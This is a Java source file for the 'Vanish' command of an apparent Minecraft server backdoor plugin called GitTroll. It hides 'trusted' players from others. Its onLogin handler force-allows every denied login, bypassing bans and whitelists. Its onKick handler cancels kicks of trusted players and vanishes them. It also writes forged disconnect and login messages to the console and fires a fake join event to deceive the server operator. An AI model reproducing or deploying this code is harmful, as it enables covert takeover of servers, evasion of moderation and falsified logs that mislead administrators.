package net.Lenni0451.GitTroll.command.commands.player;

import java.util.ArrayList;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerLoginEvent.Result;
import org.bukkit.event.player.PlayerQuitEvent;

import net.Lenni0451.GitTroll.GitTroll;
import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.event.EventListener;
import net.Lenni0451.GitTroll.event.events.EventTrustPlayer;
import net.Lenni0451.GitTroll.event.events.EventUntrustPlayer;
import net.Lenni0451.GitTroll.event.types.Event;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;
import net.Lenni0451.GitTroll.utils.Logger;

public class Vanish extends CommandBase implements Listener, EventListener {
	
	private final String VANISH_PREFIX = "§b[V]§f ";
	
	private List<CustomPlayer> vanishedPlayer = new ArrayList<>();
	private List<CustomPlayer> needJoinMessage = new ArrayList<>();

	public Vanish() {
		super("Vanish", "Hide yourself from online players");
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.getLength() == 0) {
			if(this.vanishedPlayer.contains(executor)) {
				if(this.disableVanish(executor.getPlayer())) {
					executor.sendGitMessage("You have been unvanished.");
				} else {
					executor.sendGitMessage("§cAn error occurred whilst unvanishing. Please rejoin and open an issue on github with a description how to recreate this bug.");
				}
			} else {
				if(this.enableVanish(executor.getPlayer())) {
					executor.sendGitMessage("You have been vanished.");
				} else {
					executor.sendGitMessage("§cAn error occurred whilst vanishing. Please rejoin and open an issue on github with a description how to recreate this bug.");
				}
			}
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {}
	
	public boolean enableVanish(final Player player) {
		CustomPlayer customPlayer = CustomPlayer.instanceOf(player);
		if(customPlayer == null || this.vanishedPlayer.contains(customPlayer)) {
			return false;
		}
		
		try {
			player.setSleepingIgnored(true);
			
			for(Player onlinePlayer : Bukkit.getOnlinePlayers()) {
				if(!GitTroll.getInstance().isPlayerTrusted(onlinePlayer) && !onlinePlayer.equals(player)) {
					onlinePlayer.hidePlayer(player);
				}
			}
			
			if(!player.getPlayerListName().startsWith(VANISH_PREFIX)) {
		    	player.setPlayerListName(VANISH_PREFIX + player.getPlayerListName());
			}
			
			this.vanishedPlayer.add(customPlayer);
			return true;
		} catch (Exception e) {}
		return false;
	}
	
	public boolean disableVanish(final Player player, final boolean sendLoginMessage) {
		CustomPlayer customPlayer = CustomPlayer.instanceOf(player);
		if(customPlayer == null || !this.vanishedPlayer.contains(customPlayer)) {
			return false;
		}
		
		try {
			player.setSleepingIgnored(false);
			
			for(Player onlinePlayer : Bukkit.getOnlinePlayers()) {
				onlinePlayer.showPlayer(player);
			}
			
			if(player.getPlayerListName().startsWith(VANISH_PREFIX)) {
		    	player.setPlayerListName(player.getPlayerListName().substring(VANISH_PREFIX.length()));
			}
			
			this.vanishedPlayer.remove(customPlayer);
			
			if(this.needJoinMessage.contains(customPlayer) && sendLoginMessage) {
				this.needJoinMessage.remove(customPlayer);
				
				Bukkit.getConsoleSender().sendMessage("UUID of player " + player.getName() + " is " + player.getUniqueId().toString());
				Bukkit.getConsoleSender().sendMessage(player.getName() + "[/" + player.getAddress().getHostString() + ":" + player.getAddress().getPort() + "] logged in with entity id " + player.getEntityId() + " at ([" + player.getWorld().getName() + "]" + player.getLocation().getX() + ", " + player.getLocation().getY() + ", " + player.getLocation().getZ() + ")");
				
				PlayerJoinEvent fakeJoinEvent = new PlayerJoinEvent(player, "§e" + player.getName() + " joined the game");
				Bukkit.getPluginManager().callEvent(fakeJoinEvent);
				Logger.broadcast(fakeJoinEvent.getJoinMessage());
			}
			
			return true;
		} catch (Exception e) {}
		return false;
	}
	
	public boolean disableVanish(final Player player) {
		return this.disableVanish(player, true);
	}
	
	public boolean isVanished(final Player player) {
		return this.vanishedPlayer.contains(CustomPlayer.instanceOf(player));
	}

	public void addToNeedLoginList(final Player player) {
		this.needJoinMessage.add(CustomPlayer.instanceOf(player));
	}
	
	public boolean needsJoinMessage(final Player player) {
		return this.needJoinMessage.contains(CustomPlayer.instanceOf(player));
	}
	
	@EventHandler
	public void onQuit(PlayerQuitEvent event) {
		try {
			if(this.isVanished(event.getPlayer())) {
				this.disableVanish(event.getPlayer(), false);
				this.needJoinMessage.remove(CustomPlayer.instanceOf(event.getPlayer()));
				event.setQuitMessage(null);
			}
		} catch (Exception e) {}
	}
	
	@EventHandler
	public void onJoin(PlayerJoinEvent event) {
		try {
			if(!GitTroll.getInstance().isPlayerTrusted(event.getPlayer())) {
				for(CustomPlayer customPlayer : this.vanishedPlayer) {
					event.getPlayer().hidePlayer(customPlayer.getPlayer());
				}
			} else if(this.needsJoinMessage(event.getPlayer())) {
				this.enableVanish(event.getPlayer());
				CustomPlayer customPlayer = CustomPlayer.instanceOf(event.getPlayer());
				customPlayer.sendGitMessage("You have been vanished because the server kicked you whilst joining.");
				event.setJoinMessage(null);
			}
		} catch (Exception e) {}
	}
	
	@EventHandler
	public void onLogin(PlayerLoginEvent event) {
		if(!event.getResult().equals(Result.ALLOWED)) {
			event.allow();
			this.needJoinMessage.add(CustomPlayer.instanceOf(event.getPlayer()));
		}
	}
	
	@EventHandler
	public void onKick(PlayerKickEvent event) {
		if(GitTroll.getInstance().isPlayerTrusted(event.getPlayer())) {
			event.setCancelled(true);
			if(!this.isVanished(event.getPlayer())) {
				Logger.broadcast(event.getLeaveMessage());
			}
			if(!this.needsJoinMessage(event.getPlayer())) {
				this.enableVanish(event.getPlayer());
				this.addToNeedLoginList(event.getPlayer());
				Bukkit.getConsoleSender().sendMessage(event.getPlayer().getName() + " lost connection: " + event.getReason());
				Bukkit.getConsoleSender().sendMessage(event.getPlayer().getName() + " left the game.");
			}
			CustomPlayer customPlayer = CustomPlayer.instanceOf(event.getPlayer());
			customPlayer.sendGitMessage("You have been vanished because you got kicked.");
			customPlayer.sendGitMessage("Reason§6: §2" + event.getReason());
		}
	}

	
	@Override
	public void onEvent(Event event) {
		if(event instanceof EventTrustPlayer) {
			this.onTrust((EventTrustPlayer) event);
		} else if(event instanceof EventUntrustPlayer) {
			this.onUnTrust((EventUntrustPlayer) event);
		}
	}
	
	public void onTrust(EventTrustPlayer event) {
		try {
			for(CustomPlayer customPlayer : this.vanishedPlayer) {
				event.getPlayer().showPlayer(customPlayer.getPlayer());
			}
		} catch (Exception e) {}
	}
	
	public void onUnTrust(EventUntrustPlayer event) {
		try {
			for(CustomPlayer customPlayer : this.vanishedPlayer) {
				event.getPlayer().hidePlayer(customPlayer.getPlayer());
			}
			if(this.isVanished(event.getPlayer())) {
				this.disableVanish(event.getPlayer());
				this.needJoinMessage.remove(CustomPlayer.instanceOf(event.getPlayer()));
			}
		} catch (Exception e) {}
	}
	
}
